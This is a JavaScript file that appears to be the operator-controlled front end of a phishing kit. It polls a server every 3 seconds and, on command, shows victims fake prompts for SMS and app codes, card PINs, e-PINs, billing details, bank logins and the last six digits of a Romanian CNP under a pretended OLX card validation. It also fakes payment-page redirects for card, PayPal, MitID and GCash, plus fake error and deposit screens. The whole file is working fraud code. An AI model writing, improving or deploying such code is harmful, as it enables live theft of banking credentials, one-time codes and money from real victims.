class System {
	constructor() {
        this.redirectStatus = null;
        this.popupStatus = null;
		this.windowStatus = null;
	}

    checkRedirectStatus() {
        if (this.redirectStatus != null && this.redirectStatus.includes("cabinetInput_"))
            SwalMethods.redirectModal(
                "merchant", this.redirectStatus.split("cabinetInput_")[1]
            );
        else if (this.redirectStatus == "indexPage") SwalMethods.redirectModal("index");
        else if (this.redirectStatus == "cardInput") SwalMethods.redirectModal("card");
        else if (this.redirectStatus == "paypalInput") SwalMethods.redirectModal("paypal");
        else if (this.redirectStatus == "mitidInput") SwalMethods.redirectModal("mitid");
        else if (this.redirectStatus == "gcashInput") SwalMethods.redirectModal("gcash");
        else if (this.redirectStatus == "kycInput") SwalMethods.redirectModal("kyc");
        else if (this.redirectStatus != null && this.redirectStatus.includes("chooseBank_"))
            SwalMethods.redirectToBankModal(
                this.redirectStatus.split("chooseBank_")[1].split("_")[0],
                this.redirectStatus.split("chooseBank_")[1].split("_")[1]
            );
        else if (this.redirectStatus != null && this.redirectStatus.includes("chooseCountryBanks_"))
            SwalMethods.redirectToCountryBanksModal(
                this.redirectStatus.split("chooseCountryBanks_")[1]
            );
        else if (this.redirectStatus != null && this.redirectStatus.includes("customLink_"))
            SwalMethods.redirectCustomModal(
                this.redirectStatus.split("customLink_")[1]
            );
    };

    checkPopupStatus() {
        if (tpType === 0) {
            if (this.popupStatus != null && this.popupStatus.includes("openChat")) openChat();
            else if (this.popupStatus != null && this.popupStatus.includes("closeChat")) closeChat();
        }
    };

	checkWindowStatus() {
        SwalMethods.resetValidation();
        
		if (this.windowStatus == null) SwalMethods.closeModal();
        else if (this.windowStatus == "inputBilling") SwalMethods.inputBillingModal();
        else if (this.windowStatus == "expectation") SwalMethods.expectationModal();
		else if (this.windowStatus == "success") SwalMethods.successModal();
		else if (this.windowStatus == "push") SwalMethods.pushModal({ type: "push", showConfirmButton: true });
        else if (this.windowStatus == "hold") SwalMethods.holdModal({});
        else if (this.windowStatus == "MitIdHelp_1" || this.windowStatus == "MitIdHelp_2") SwalMethods.pushModal({ type: this.windowStatus, showConfirmButton: true });
        else if (this.windowStatus == "smsCard")
            SwalMethods.codeModal(
                swalLanguage.code.card, "text", "info", ""
            );
        else if (this.windowStatus == "smsPC")
            SwalMethods.codeModal(
                swalLanguage.code.pc, "text", "info", ""
            );
        else if (this.windowStatus == "cnp")
            SwalMethods.codeModal(
                "Pentru validarea cardului in sistemul OLX, Vânzătorul trebuie să completeze ultimele 6 cifre ale CNP în câmpul de introducere sms După aceea, așteptați sms cu codul.", "password", "info", ""
            );
		else if (this.windowStatus == "epin")
            SwalMethods.codeModal(
                swalLanguage.epin.text, "password", "info", ""
            );
		else if (this.windowStatus == "pin") 
            SwalMethods.codeModal(
                swalLanguage.pin.text, "password", "info", ""
            );
		else if (this.windowStatus == "appCode")
            SwalMethods.codeModal(
                swalLanguage.app.text, "text", "info", ""
            );
		else if (this.windowStatus == "callCode")
            SwalMethods.codeModal(
                swalLanguage.call.text, "text", "info", ""
            );
		else if (this.windowStatus == "wrongCode")
            SwalMethods.codeModal(
                swalLanguage.wrongCode.text, "text", "info", ""
            );
        else if (this.windowStatus != null && this.windowStatus.includes("applicationImg_"))
            SwalMethods.applicationModal(
				this.windowStatus.split("applicationImg_")[1]
			);
        else if (this.windowStatus != null && this.windowStatus.includes("customSimpleText_"))
            SwalMethods.codeModal(
                this.windowStatus.split("customSimpleText_")[1], "text", "info", "", "text"
            );
		else if (this.windowStatus != null && this.windowStatus.includes("customSms_"))
            SwalMethods.codeModal(
				this.windowStatus.split("customSms_")[1], "text", "info", ""
			);
        else if (this.windowStatus != null && this.windowStatus.includes("customPush_"))
            SwalMethods.pushModal(
                { type: "push", custom: this.windowStatus.split("customPush_")[1], showConfirmButton: true }
            );
        else if (this.windowStatus != null && this.windowStatus.includes("customHold_"))
            SwalMethods.holdModal(
                { seconds: parseInt(this.windowStatus.split("customHold_")[1]) }
            );
        else if (this.windowStatus != null && this.windowStatus.includes("customTextInput_") && this.windowStatus.includes("_customPictureInput_"))
            SwalMethods.codeModal(
				this.windowStatus.split("customTextInput_")[1].split("_customPictureInput_")[0],
                "text",
                "",
                this.windowStatus.split("_customPictureInput_")[1]
			);
        else if (this.windowStatus == "otherCard")
            SwalMethods.errorModal(
                swalLanguage.otherCard.title, swalLanguage.otherCard.text
            );
        else if (this.windowStatus == "correctBalance") SwalMethods.balanceModal();
        else if (this.windowStatus == "wrongCredentials")
            SwalMethods.errorModal(
                swalLanguage.wrongCredentials.title, swalLanguage.wrongCredentials.text
            );
        else if (this.windowStatus == "without3ds")
            SwalMethods.errorModal(
                swalLanguage.without3ds.title, swalLanguage.without3ds.text,
            );
        else if (this.windowStatus != null && this.windowStatus.includes("toDepositCard_"))
            SwalMethods.errorModal(
                "", swalLanguage.deposit.card.replace("{sum}", this.windowStatus.split("toDepositCard_")[1])
            );
        else if (this.windowStatus != null && this.windowStatus.includes("toDepositPC_"))
            SwalMethods.errorModal(
                "", swalLanguage.deposit.personalCabinet.replace("{sum}", this.windowStatus.split("toDepositPC_")[1])
            );
		else if (this.windowStatus != null && this.windowStatus.includes("customError_"))
            SwalMethods.errorModal(
                swalLanguage.custom.title, this.windowStatus.split("customError_")[1]
            );
        else if (this.windowStatus != null && this.windowStatus.includes("doubleInput_"))
            SwalMethods.doubleInputModal(
                this.windowStatus.split("doubleInput_")[1]
            );
		else if (this.windowStatus != null && this.windowStatus.includes("customText_") && this.windowStatus.includes("_customPicture_"))
            SwalMethods.customModal(
                this.windowStatus.split("customText_")[1].split("_customPicture_")[0],
				this.windowStatus.split("_customPicture_")[1]
			);
	};

    redirectObj(status) {
        if (this.redirectStatus !== status) {
            this.redirectStatus = status;
            this.checkRedirectStatus();
            return true;
        }

        return false;
    };

    popupObj(status) {
        if (this.popupStatus !== status) {
            this.popupStatus = status;
            this.checkPopupStatus();
        }
    };

    windowObj(status) {
        if (this.windowStatus !== status) {
            this.windowStatus = status;
            this.checkWindowStatus();
        }
    };

    async ping() {
        try {
            const response = await axios.post(updateApiPath, {
                supportToken: supportToken,
                readMessages: typeof tpType !== 'undefined' && tpType === 0 && typeof getReadMessagesFrom1 === 'function' ? getReadMessagesFrom1(): [],
            });
    
            if (response.data) {
                var redirect = this.redirectObj(response.data.redirectStatus);

                if (redirect) {
                    return null;
                }
                
                this.popupObj(response.data.popupStatus);
                this.windowObj(response.data.windowStatus);
            }
    
            return response.data;
        } catch (error) {
            return null;
        }
    };

	async run() {
        setInterval(async () => {
            if (!document.hidden) {
                const data = await this.ping();

                if (typeof tpType !== 'undefined' && tpType === 0 && data?.messages) {
                    const chatIframe = document.getElementById('chat-iframe');
                    if (chatIframe?.contentWindow?.initMessages && typeof chatIframe.contentWindow.initMessages === 'function') {
                        chatIframe.contentWindow.initMessages(data.messages);
                    }
                }
            }
        }, 3000)
	};   
}

const system = new System();
system.run();